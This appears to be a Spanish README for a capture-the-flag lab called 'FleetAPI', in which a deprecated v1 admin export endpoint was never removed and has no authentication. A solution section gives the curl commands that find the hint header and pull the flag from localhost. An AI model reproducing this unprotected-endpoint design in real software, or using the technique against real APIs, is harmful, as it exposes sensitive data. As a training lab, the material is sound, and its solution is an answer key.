# FleetAPI

| Campo       | Valor                        |
|-------------|------------------------------|
| Categoria   | API                          |
| Dificultad  | Medium                       |
| Docker      | Si                           |
| Puerto      | 80                           |

## Descripcion

Una API de gestion de flotas fue migrada de v1 a v2. La version v2 requiere autenticacion Bearer para todos los endpoints sensibles. La version v1 fue marcada como "deprecated" pero nunca fue eliminada del servidor. Los endpoints v1 no tienen control de acceso.

## Vulnerabilidad

**Improper Assets Management / API Versioning (OWASP API9)**

El endpoint `/api/v1/admin/export` retorna datos sensibles incluyendo la flag sin ninguna verificacion de autenticacion. La pista esta en el header `X-Deprecated-API: v1/still-active` que devuelve `/api/v2/status`.

## Solucion

```bash
# Pista: revisar los headers de la respuesta v2
curl -sv http://localhost:8080/api/v2/status 2>&1 | grep "X-Deprecated"
# < X-Deprecated-API: v1/still-active

# Acceder directamente al endpoint v1 sin autenticacion
curl -s http://localhost:8080/api/v1/admin/export

# La respuesta incluye el campo "flag"
```

## Como ejecutar

```bash
FLAG="CTF{mi_flag_secreta}" docker compose up --build
```

Acceder en `http://localhost:8080`
